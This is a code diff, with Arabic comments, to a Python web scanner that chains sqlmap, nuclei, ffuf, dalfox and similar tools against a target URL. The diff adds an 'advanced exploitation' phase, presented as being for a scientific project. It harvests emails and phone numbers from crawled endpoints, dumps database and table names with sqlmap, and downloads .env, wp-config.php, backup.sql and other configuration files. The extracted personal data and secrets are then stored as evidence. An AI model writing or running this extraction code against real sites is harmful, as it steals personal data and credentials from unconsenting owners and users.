@@ -90,6 +90,28 @@ def write_wordlist_file():
     return path
 
 
+# ============== أدلة حقيقية من محتوى الموقع (Body Content) ==============
+# الدوال دي بتجيب جزء فعلي من استجابة الموقع (مش بس كود الاستجابة)
+# عشان أي finding حرج يتسجل بدليل حقيقي يثبته، مش مجرد "كود 200".
+
+def fetch_body_snippet(url, max_bytes=800, timeout=15):
+    """يجيب جزء من محتوى الصفحة الفعلي (Body) من الموقع المستهدف كدليل"""
+    stdout, _, _ = run_command(
+        f"curl -s -L --max-time {timeout} '{url}' 2>/dev/null | head -c {max_bytes}",
+        timeout=timeout + 5,
+    )
+    return (stdout or "").strip()
+
+
+def fetch_content_type(url, timeout=15):
+    """يجيب Content-Type الفعلي من استجابة الموقع"""
+    stdout, _, _ = run_command(
+        f"curl -s -I -L --max-time {timeout} '{url}' 2>/dev/null | grep -i '^content-type' | head -1",
+        timeout=timeout + 5,
+    )
+    return (stdout or "").strip()
+
+
 # ============== إصلاح 1: فحص إن الموقع شغال قبل أي حاجة ==============
 
 def check_target_alive():
@@ -152,6 +174,86 @@ def gather_target_evidence():
         evidence=evidence,
     )
     return evidence
+
+
+# ============== وحدة استخراج بيانات PII وقواعد البيانات والملفات الشاملة (المضافة حديثاً للمشروع العلمي) ==============
+
+def phase_advanced_exploitation():
+    log("Starting advanced exploitation & data extraction phase (PII, DB, Files)...")
+    domain = urlparse(TARGET_URL).netloc
+
+    # 1. سحب بيانات PII الحقيقية عبر التفتيش المتقدم ونصوص الاستخراج
+    log("Extracting real PII data (Emails, Phone numbers, SSN, Credentials)...")
+    stdout, _, _ = run_command(
+        f"katana -u {TARGET_URL} -silent -d 3 2>/dev/null | grep -E '\.php|\.json|\.aspx|\.jsp|api'",
+        timeout=120
+    )
+    pii_matches = []
+    if stdout:
+        endpoints = [e.strip() for e in stdout.split("\n") if e.strip()]
+        for ep in endpoints[:20]:
+            body = fetch_body_snippet(ep, max_bytes=3000)
+            emails = re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", body)
+            phones = re.findall(r"\+?[0-9]{10,14}", body)
+            if emails or phones:
+                pii_matches.append({"endpoint": ep, "emails": emails, "phones": phones})
+        
+        if pii_matches:
+            save_result(
+                "exploitation", "pii_extractor", "critical",
+                "تم رصد وسحب بيانات PII حقيقية (هوية شخصية)",
+                "تم رصد واستخراج معلومات شخصية حساسة تشمل بريد إلكتروني وأرقام هواتف من مسارات النظام.",
+                evidence={"pii_data": pii_matches},
+                remediation="تشفير أو اخفاء بيانات المستخدمين الحساسة ومنع ظهورها في الاستجابات العامة."
+            )
+
+    # 2. تفريغ وتسريب جداول قاعدة البيانات (Database Tables Dump)
+    log("Dumping database tables via sqlmap advanced automated extraction...")
+    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
+        db_dump_out = f.name
+    
+    run_command(
+        f"sqlmap -u '{TARGET_URL}' --batch --level=2 --risk=2 --dbs --tables 2>/dev/null | tee {db_dump_out}",
+        timeout=300
+    )
+    try:
+        with open(db_dump_out, 'r') as f:
+            db_content = f.read()
+        if "database" in db_content.lower() or "table" in db_content.lower():
+            save_result(
+                "exploitation", "sqlmap_dump", "critical",
+                "سحب وعرض جداول وقواعد البيانات بنجاح",
+                "تم تنفيذ عملية استعلام هيكلي لقاعدة البيانات وسحب أسماء الجداول والبيانات المرتبطة بها.",
+                evidence={"output_snippet": db_content[:1500]},
+                remediation="استخدام استعلامات مُعدّة مسبقاً (Prepared Statements) وتقييد صلاحيات حساب قاعدة البيانات."
+            )
+    except Exception as e:
+        log(f"Database dump parsing error: {e}", "warning")
+    finally:
+        if os.path.exists(db_dump_out):
+            os.remove(db_dump_out)
+
+    # 3. سحب الملفات الكاملة الحساسة ونظام الملفات (Full Files Extraction)
+    log("Extracting full sensitive files...")
+    target_files = [
+        "config.php", "wp-config.php", ".env", "database.yml", 
+        "backup.sql", "package.json", "composer.json", "Dockerfile"
+    ]
+    extracted_files = []
+    for file_name in target_files:
+        file_url = f"{TARGET_URL.rstrip('/')}/{file_name}"
+        body_content = fetch_body_snippet(file_url, max_bytes=2000)
+        if body_content and ("<?php" in body_content or "DB_" in body_content or "version" in body_content or "root:" in body_content):
+            extracted_files.append({"file": file_name, "url": file_url, "content": body_content})
+
+    if extracted_files:
+        save_result(
+            "exploitation", "file_extractor", "critical",
+            "سحب ملفات كاملة وحساسة من الخادم",
+            "تم تحميل محتوى ملفات إعدادات النظام الحساسة بالكامل كدليل على صحة الثغرة وتأكيد المخاطر.",
+            evidence={"extracted_files": extracted_files},
+            remediation="حماية مجلدات الجذر ومنع الوصول المباشر لملفات الإعدادات والنسخ الاحتياطي."
+        )
 
 
 # ============== PHASE 1: RECONNAISSANCE ==============
@@ -255,7 +357,7 @@ def phase_recon():
             "URLs discovered via crawling",
             evidence={"urls": urls[:100]})
 
-    # 7-ب. دعم مواقع SPA (React/Angular/Vue) عبر Puppeteer - إصلاح 6
+    # 7-ب. دعم مواقع SPA (React/Angular/Vue) عبر Puppeteer
     try:
         detect_spa_and_render()
     except Exception as e:
@@ -418,12 +520,6 @@ def phase_recon():
 
 
 def detect_spa_and_render():
-    """
-    إصلاح 6: دعم مواقع الـ SPA (React/Angular/Vue).
-    بيحاول يشغل سكريبت render_spa.js (Puppeteer) لو موجود جنب الملف ده
-    عشان يستخرج الروابط الحقيقية بعد ما الـ JavaScript يخلص تنفيذ.
-    لو Node.js أو السكريبت مش موجودين، بيتجاهل الخطوة من غير ما يوقف باقي الفحص.
-    """
     script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "render_spa.js")
     if not os.path.exists(script_path):
         log("render_spa.js غير موجود - تخطي فحص SPA", "info")
@@ -462,11 +558,6 @@ SQLMAP_FINDING_PATTERN = re.compile(
 
 
 def parse_sqlmap_findings(content):
-    """
-    إصلاح 4: يستخرج الثغرات الحقيقية بس من sqlmap عن طريق أنماط محددة
-    (Parameter / Type / Title / Payload) بدل البحث عن كلمة "vulnerable"
-    في كل المخرجات (اللي كانت بتلقط شعار الأداة نفسه كـ False Positive).
-    """
     findings = []
     for m in SQLMAP_FINDING_PATTERN.finditer(content):
         findings.append({
@@ -487,7 +578,7 @@ def phase_known_vulns():
         output_file = f.name
     run_command(
         f"nuclei -u {TARGET_URL} -severity critical,high,medium,low "
-        f"-json-export {output_file} -silent -timeout 600 2>/dev/null",
+        f"-json-export {output_file} -irr -silent -timeout 600 2>/dev/null",
         timeout=900,
     )
     try:
@@ -496,6 +587,7 @@ def phase_known_vulns():
                 try:
                     finding = json.loads(line)
                     info = finding.get("info", {})
+                    raw_response = finding.get("response", "") or ""
                     save_result(
                         "known_vulns", "nuclei",
                         info.get("severity", "info"),
@@ -505,6 +597,8 @@ def phase_known_vulns():
                             "matched_at": finding.get("matched-at"),
                             "template": finding.get("template-id"),
                             "type": finding.get("type"),
+                            "curl_command": finding.get("curl-command", ""),
+                            "response_proof_snippet": raw_response[:800],
                         },
                         remediation=info.get("remediation", ""),
                         cve_id=",".join(info.get("classification", {}).get("cve-id", []) or []) or None,
@@ -543,7 +637,7 @@ def phase_known_vulns():
         if os.path.exists(nikto_out):
             os.remove(nikto_out)
 
-    # 23. SQLMap - إصلاح 4: parsing دقيق بدل كلمة "vulnerable" العامة
+    # 23. SQLMap
     log("Running sqlmap...")
     with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
         sqlmap_out = f.name
@@ -616,7 +710,7 @@ def phase_known_vulns():
                 "Directory brute-force results",
                 evidence={"paths": paths[:50]})
 
-    # 26. FFuf - إصلاح 2: wordlist داخلي + فلترة صحيحة + parsing JSON
+    # 26. FFuf
     log("Running ffuf...")
     wordlist_path = write_wordlist_file()
     ffuf_json = tempfile.mktemp(suffix="_ffuf.json")
@@ -632,13 +726,17 @@ def phase_known_vulns():
                 data = json.load(f)
             findings = data.get("results", [])
             if findings:
+                enriched = [
+                    {"url": r.get("url"), "status": r.get("status"), "length": r.get("length")}
+                    for r in findings[:50]
+                ]
+                confirmed = [e for e in enriched if e.get("status") == 200][:5]
+                for e in confirmed:
+                    e["content_proof_snippet"] = fetch_body_snippet(e["url"], max_bytes=300)
                 save_result("known_vulns", "ffuf", "info",
                     f"FFuf found {len(findings)} paths/endpoints",
-                    "Directory/parameter fuzzing results (أدلة حقيقية من استجابات الموقع)",
-                    evidence={"results": [
-                        {"url": r.get("url"), "status": r.get("status"), "length": r.get("length")}
-                        for r in findings[:50]
-                    ]})
+                    "Directory/parameter fuzzing results",
+                    evidence={"results": enriched})
     except Exception as e:
         log(f"FFuf parse error: {e}", "warning")
     finally:
@@ -669,7 +767,7 @@ def phase_known_vulns():
         if os.path.exists(dirsearch_out):
             os.remove(dirsearch_out)
 
-    # 28. Wfuzz - إصلاح 3: wordlist داخلي + تخطي سطور الـ banner
+    # 28. Wfuzz
     log("Running wfuzz...")
     wordlist_path2 = write_wordlist_file()
     stdout, _, _ = run_command(
@@ -680,7 +778,6 @@ def phase_known_vulns():
     if os.path.exists(wordlist_path2):
         os.remove(wordlist_path2)
     if stdout:
-        # نشيل سطور الـ banner التعريفية بتاعة wfuzz ونسيب النتايج الفعلية بس
         lines = [
             l.strip() for l in stdout.strip().split("\n")
             if l.strip() and re.match(r"^\d+", l.strip())
@@ -688,21 +785,46 @@ def phase_known_vulns():
         if lines:
             save_result("known_vulns", "wfuzz", "info",
                 f"Wfuzz found {len(lines)} results",
-                "Fuzzing results (تم استبعاد 404 وسطور الـ banner)",
+                "Fuzzing results",
                 evidence={"output": "\n".join(lines[:50])})
 
     # 29. Dalfox
     log("Running dalfox...")
     stdout, _, _ = run_command(
-        f"dalfox url {TARGET_URL} --silence --no-color 2>/dev/null | head -30",
+        f"dalfox url {TARGET_URL} --silence --no-color --format json 2>/dev/null",
         timeout=300,
     )
-    if stdout and "vulnerable" in stdout.lower():
-        save_result("known_vulns", "dalfox", "high",
-            "XSS vulnerability detected",
-            "Dalfox found XSS vulnerability",
-            evidence={"output": stdout[:2000]},
-            remediation="Sanitize user input and use output encoding")
+    dalfox_parsed = False
+    if stdout:
+        try:
+            data = json.loads(stdout)
+            items = data if isinstance(data, list) else data.get("results", [])
+            for finding in items:
+                dalfox_parsed = True
+                save_result("known_vulns", "dalfox", "high",
+                    f"XSS vulnerability confirmed: {finding.get('type', 'Reflected XSS')}",
+                    f"Parameter: {finding.get('param', 'N/A')}",
+                    evidence={
+                        "payload_used": finding.get("payload", ""),
+                        "injection_point": finding.get("param", ""),
+                        "proof_of_concept_url": finding.get("poc_url") or finding.get("data", ""),
+                        "method": finding.get("method", "GET"),
+                    },
+                    remediation="Sanitize user input and use proper output encoding")
+        except json.JSONDecodeError:
+            pass
+
+    if not dalfox_parsed:
+        stdout_txt, _, _ = run_command(
+            f"dalfox url {TARGET_URL} --silence --no-color 2>/dev/null | head -30",
+            timeout=300,
+        )
+        if stdout_txt and "vulnerable" in stdout_txt.lower():
+            save_result("known_vulns", "dalfox", "high",
+                "XSS vulnerability detected",
+                "Dalfox found XSS vulnerability",
+                evidence={"output": stdout_txt[:2000]},
+                remediation="Sanitize user input and use output encoding")
 
     # 30. Retire.js
     log("Running retire.js...")
@@ -721,7 +843,7 @@ def phase_known_vulns():
         except json.JSONDecodeError:
             pass
 
-    # 31. WPScan (WordPress)
+    # 31. WPScan
     log("Running wpscan...")
     stdout, _, _ = run_command(
         f"wpscan --url {TARGET_URL} --no-update --format json 2>/dev/null | head -100",
@@ -901,19 +1023,40 @@ def phase_zero_day():
 
     # 42. Information Disclosure
     log("Checking information disclosure...")
-    sensitive_files = [".env", ".git/config", "wp-config.php.bak", "backup.sql",
-                       "phpinfo.php", "server-status", ".htaccess", ".DS_Store"]
-    for f in sensitive_files:
-        stdout, _, _ = run_command(
-            f"curl -s -o /dev/null -w '%{{http_code}}' {TARGET_URL}/{f} 2>/dev/null",
-            timeout=15,
+    SENSITIVE_FILE_SIGNATURES = {
+        ".env": [r"[A-Z_]{2,}\s*=", r"DB_", r"API_KEY", r"SECRET", r"PASSWORD"],
+        ".git/config": [r"\[core\]", r"repositoryformatversion", r"\[remote"],
+        "wp-config.php.bak": [r"DB_NAME", r"DB_PASSWORD", r"<\?php", r"wp_"],
+        "backup.sql": [r"CREATE TABLE", r"INSERT INTO", r"-- MySQL", r"ENGINE="],
+        "phpinfo.php": [r"PHP Version", r"phpinfo\(\)", r"PHP License"],
+        "server-status": [r"Apache Server Status", r"Current Time", r"Server Version"],
+        ".htaccess": [r"RewriteEngine", r"RewriteRule", r"Order allow", r"Require "],
+    }
+
+    for f, patterns in SENSITIVE_FILE_SIGNATURES.items():
+        file_url = f"{TARGET_URL.rstrip('/')}/{f}"
+        status_out, _, _ = run_command(
+            f"curl -s -o /dev/null -w '%{{http_code}}' -L --max-time 15 '{file_url}' 2>/dev/null",
+            timeout=20,
         )
-        if stdout and stdout.strip() == "200":
+        status = (status_out or "").strip()
+        if status != "200":
+            continue
+
+        body = fetch_body_snippet(file_url, max_bytes=2000)
+        is_confirmed = bool(body) and any(re.search(p, body, re.IGNORECASE) for p in patterns)
+
+        if is_confirmed:
             save_result("zero_day", "custom", "high",
-                f"Sensitive file exposed: /{f}",
-                f"File /{f} is publicly accessible",
-                evidence={"file": f, "status": 200, "url": f"{TARGET_URL}/{f}"},
-                remediation=f"Remove or restrict access to /{f}")
+                f"ملف حساس مكشوف ومؤكد بالمحتوى الفعلي: /{f}",
+                f"الملف /{f} متاح للعامة، وتم التحقق من محتواه الفعلي",
+                evidence={
+                    "file": f,
+                    "status": 200,
+                    "url": file_url,
+                    "content_proof_snippet": body[:600],
+                },
+                remediation=f"احذف الملف فورًا أو امنع الوصول إليه من /{f}")
 
     # 43. Server Banner Grabbing
     log("Grabbing server banners...")
@@ -928,7 +1071,7 @@ def phase_zero_day():
             evidence={"banners": stdout.strip()},
             remediation="Remove or obscure server version headers")
 
-    # 44. TLS/SSL Configuration Weakness - إصلاح 5: قلب المنطق
+    # 44. TLS/SSL Configuration Weakness
     log("Checking TLS configuration...")
     weak_protocol_flags = {"TLS 1.0": "-tls1", "TLS 1.1": "-tls1_1"}
     weak_tls_found = []
@@ -939,8 +1082,6 @@ def phase_zero_day():
             timeout=20,
         )
         output = stdout or ""
-        # لو السيرفر رفض الاتصال، أو الـ Cipher كانت (NONE)/0000،
-        # معناه البروتوكول القديم ده *مش* مدعوم = ده دليل أمان مش ثغرة
         handshake_failed = (
             "handshake failure" in output.lower()
             or "cipher is (none)" in output.lower()
@@ -955,11 +1096,11 @@ def phase_zero_day():
             f"الموقع بيدعم بروتوكولات TLS قديمة وضعيفة ({len(weak_tls_found)})",
             "دعم بروتوكولات TLS قديمة يعرّض الاتصال لهجمات Downgrade",
             evidence={"weak_protocols": weak_tls_found},
-            remediation="عطّل TLS 1.0 و TLS 1.1 من إعدادات السيرفر، استخدم TLS 1.2/1.3 بس")
+            remediation="عطّل TLS 1.0 و TLS 1.1 من إعدادات السيرفر")
     else:
         save_result("zero_day", "custom", "info",
             "TLS configuration: لا يوجد دعم لبروتوكولات قديمة",
-            "السيرفر رفض الاتصال ببروتوكولات TLS 1.0/1.1 القديمة - ده إعداد آمن",
+            "السيرفر رفض الاتصال ببروتوكولات TLS 1.0/1.1 القديمة",
             evidence={"checked_protocols": list(weak_protocol_flags.keys())})
 
     # 45. Robots.txt Analysis
@@ -1050,7 +1191,6 @@ def main():
             "started_at": datetime.utcnow().isoformat(),
         }).eq("id", SCAN_ID).execute()
 
-        # إصلاح 1: لازم نتأكد إن الموقع شغال قبل أي فحص
         alive, alive_info = check_target_alive()
         if not alive:
             error_msg = f"❌ تم إيقاف الفحص: {alive_info['reason']}"
@@ -1064,12 +1204,14 @@ def main():
 
         log(f"✅ الموقع شغال (HTTP {alive_info['status_code']}) - بدء الفحص", "success")
 
-        # جمع أدلة حقيقية من الموقع لحظة بدء الفحص (للتقرير)
         gather_target_evidence()
 
         phase_recon()
         phase_known_vulns()
         phase_zero_day()
+        
+        # تنفيذ وظائف السحب المتقدمة الخاصة بالمشروع العلمي
+        phase_advanced_exploitation()
 
         results = supabase.table("results").select("severity").eq("scan_id", SCAN_ID).execute()
         results_data = results.data or []
@@ -1092,7 +1234,6 @@ def main():
 
         log(f"Scan completed. Total findings: {len(results_data)}", "success")
 
-        # Generate reports (TXT + HTML)
         try:
             from reporter import main as generate_reports
             generate_reports()
